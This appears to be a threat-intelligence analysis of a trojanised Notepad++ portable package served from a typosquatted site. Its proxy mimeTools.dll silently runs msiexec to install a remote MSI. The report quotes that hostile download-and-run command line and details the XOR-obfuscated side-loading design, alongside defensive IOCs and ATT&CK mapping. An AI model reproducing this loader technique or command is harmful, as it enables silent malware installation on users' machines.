 Trojanised Notepad++ portable delivers silent MSI payload via proxied plugin

## Executive summary

A typosquatted clone of the official Notepad++ website, `notepad-plusplus[.]org` (official: `notepad-plus-plus.org`), hosts a ZIP file of the genuine, signed Notepad++ 8.4.4 portable build. The operator altered exactly one component. The legitimate `mimeTools` plugin was renamed to `mimeTools_bak.dll`, and a small malicious DLL was placed under its original name. Notepad++ loads every plugin at start-up. The malicious DLL forwards all plugin functions to the renamed original, so the editor works normally. At the same time it silently starts `msiexec.exe` to download and install a remote MSI package from `hxxp://147.45.60[.]44/files/fz/setup[.]msi`. The routine repeats every time the victim opens Notepad++.

The stage-3 server was refusing connections at the time of analysis, so the final payload could not be recovered or attributed to a malware family.

## Infection chain

```
Search / ad / typo ──► notepad-plusplus[.]org (cloned site, 82.221.136[.]52, AS50613 IS)
        │  "Download" → notepad++.zip  (sha256 50d32c76…18a2d)
        ▼
User extracts portable package and runs notepad++.exe   (genuine, validly signed)
        │  Notepad++ loads plugins\mimeTools\mimeTools.dll
        ▼
mimeTools.dll (malicious, 10 KB, unsigned, x86)          [T1574.002 DLL side-loading]
   ├─ exports forwarded → mimeTools_bak.dll (genuine plugin keeps working)
   ├─ DllMain(PROCESS_ATTACH): decode URL (stack string, XOR 0x5A)        [T1027]
   └─ CreateThread → CreateProcessW(CREATE_NO_WINDOW, SW_HIDE):
        C:\Windows\System32\msiexec.exe /i "hxxp://147.45.60[.]44/files/fz/setup[.]msi" /qn /norestart
                                                                           [T1218.007]
        ▼
setup.msi installed silently from AS215540 (not recovered)               [T1105]
```

## Stage 0: delivery infrastructure

| Item | Value |
|---|---|
| Domain | `notepad-plusplus[.]org` (hyphen dropped between "plus" and "plus") |
| Hosting | 82.221.136[.]52, AS50613 Advania Island ehf (ThorDC), Iceland, LiteSpeed |
| TLS | `*.notepad-plusplus[.]org`, issued 2026-08-25 13:31 UTC |
| Observed in urlscan.io | 2026-10-12 and 2026-10-16, title "Notepad++" |
| Site build | A browser "Save page as" copy of the real site. Resources sit under `Notepad++_files/*.download`. It still hot-links fonts and the favicon from the real `notepad-plus-plus.org`, and even the real site's Carbon Ads placement. |
| Tracking | `counter.php?key=unique-name-1&action=get`, an operator-side visit/download counter |

## Stage 1: the archive

`notepad++.zip` (5,308,760 bytes, stored and not compressed) was diffed file by file against the official `npp.8.4.4.portable.zip` from the Notepad++ GitHub releases:

| Result | Files |
|---|---|
| Identical to official | `notepad++.exe`, `updater/GUP.exe`, `updater/gup.xml`, `libcurl.dll`, all other plugins, themes and localisations |
| **Replaced** | `plugins/mimeTools/mimeTools.dll` |
| **Added** | `plugins/mimeTools/mimeTools_bak.dll`. Its hash equals the official `mimeTools.dll` (`87030d0c…ffc4ce`). |
| Added by a test run | `langs.xml`, `stylers.xml`, `session.xml`, `plugins/Config/converter.ini`, and a modified `config.xml`. Notepad++ creates these on first launch, so the operator ran the package before shipping it. |

**Operator artifacts**

- The ZIP was created on a Unix host (create_system=3).
- `config.xml` holds the path `C:\Users\vboxuser\Downloads\notepad++ (1)\notepad++\stylers.xml`. `vboxuser` is the default account of a VirtualBox unattended Windows install, and it matches the DLL's PDB path (below). The DLL was built and the package tested in the same VirtualBox VM.
- The bulk file timestamps are 2026-08-25, the same day the site's TLS certificate was issued. The loader was added on 2026-09-09.
- **Timezone indicator:** the DLL's PE timestamp is 2026-09-09 19:28:02 UTC, and its ZIP entry is stamped 22:28:04 in the packer's local time. The packer's clock was set to **UTC+3**. This is weak evidence (it's a VM clock).

## Stage 2: `mimeTools.dll` proxy downloader

| Property | Value |
|---|---|
| SHA256 | `b32a277fa820189489ea1159b717045b23026304057c88865220f07045e82019` |
| Type | PE32 DLL, x86, 10,240 bytes, unsigned, MSVC (needs VCRUNTIME140) |
| Compiled | 2026-09-09 19:28:02 UTC |
| PDB | `C:\Users\vboxuser\source\repos\mimeTools\Release\mimeTools.pdb` |
| Exports | `beNotified`, `getFuncsArray`, `getName`, `isUnicode`, `messageProc`, `setInfo`, **all forwarded** to `mimeTools_bak.<name>` |
| Imports of note | `CreateThread`, `CreateProcessW`, `MultiByteToWideChar`, `DisableThreadLibraryCalls` |

**Execution flow (static analysis with capstone)**

1. `DllMain` at `0x10001100`, on `DLL_PROCESS_ATTACH`, calls `DisableThreadLibraryCalls`.
2. It writes 38 bytes to the stack with nine `mov dword` and one `mov word` instructions, then decodes them in a loop: `mov cl,[ebp+eax-0x62c]; xor cl,0x5A; je end; mov [ebp+eax-0x204],cl`. The result is `http://147.45.60.44/files/fz/setup.msi`. The URL never appears in plaintext in the file.
3. It converts the URL to UTF-16 (`MultiByteToWideChar`), copies it to the heap and calls `CreateThread(0x10001010, url)`. Doing the work in a thread avoids blocking the loader lock.
4. The thread at `0x10001010` formats `C:\Windows\System32\msiexec.exe /i "%s" /qn /norestart`. It then calls `CreateProcessW` with `CREATE_NO_WINDOW` (0x08000000), with `STARTUPINFO.dwFlags = STARTF_USESHOWWINDOW` and `wShowWindow = SW_HIDE`, and closes the handles.
5. There is no mutex, no anti-analysis and no persistence of its own. It re-runs every time Notepad++ starts, so persistence comes from the user's habit of opening the editor.

**Design notes:** Delegating download and installation to the signed Windows binary `msiexec.exe` keeps the implant tiny, with no network code. Network activity and MSI custom actions then appear under a trusted Microsoft process, which hampers attribution in EDR telemetry.

## Stage 3: `setup.msi` (not recovered)

| Item | Value |
|---|---|
| URL | `hxxp://147.45.60[.]44/files/fz/setup[.]msi` |
| Host | 147.45.60[.]0/24 `GCS_SER-NET`, AS215540 Global Connectivity Solutions LLP |
| Status (2026-10-18) | TCP 80, 443, 8000, 8080 and 8443 all refused. Never seen in urlscan.io. |

The path segment `fz` suggests the operator organises payloads by lure brand, where "fz" plausibly means FileZilla. In the same hunt window the tracker separately observed `filezilla[.]cc` serving `serverpython86.exe` (150.241.66[.]54, AS210457). **No technical link between the two has been established**, and the connection is a hypothesis only.

## MITRE ATT&CK

| Tactic | Technique | Evidence |
|---|---|---|
| Resource Development | T1583.001 Acquire Infrastructure: Domains | Typosquat `notepad-plusplus[.]org` |
| Resource Development | T1608.001 Stage Capabilities: Upload Malware | ZIP and MSI staged on operator hosts |
| Initial Access / Execution | T1204.002 User Execution: Malicious File | User runs the downloaded portable editor |
| Defense Evasion | T1036.005 Masquerading: Match Legitimate Name | Malicious DLL uses the genuine plugin's name |
| Persistence / Defense Evasion | T1574.002 Hijack Execution Flow: DLL Side-Loading | Proxy plugin loaded by signed notepad++.exe, exports forwarded |
| Defense Evasion | T1027 Obfuscated Files or Information | XOR-0x5A stack string for the URL |
| Defense Evasion | T1218.007 System Binary Proxy Execution: Msiexec | `msiexec /i <url> /qn` |
| Defense Evasion | T1564.003 Hide Artifacts: Hidden Window | `CREATE_NO_WINDOW` and `SW_HIDE` |
| Command and Control | T1105 Ingress Tool Transfer | Remote MSI retrieval |


## Indicators 

| Type | Indicator | Stage |
|---|---|---|
| domain | notepad-plusplus[.]org | delivery |
| ip | 82.221.136[.]52 | delivery |
| url | hxxps://notepad-plusplus[.]org/notepad++[.]zip | delivery |
| sha256 | 50d32c766d09b24f448fd171c2786eaa9cf89ae3ace48c77817a93ec99518a2d | archive |
| sha256 | b32a277fa820189489ea1159b717045b23026304057c88865220f07045e82019 | loader |
| url | hxxp://147.45.60[.]44/files/fz/setup[.]msi | payload |
| ip | 147.45.60[.]44 | payload |
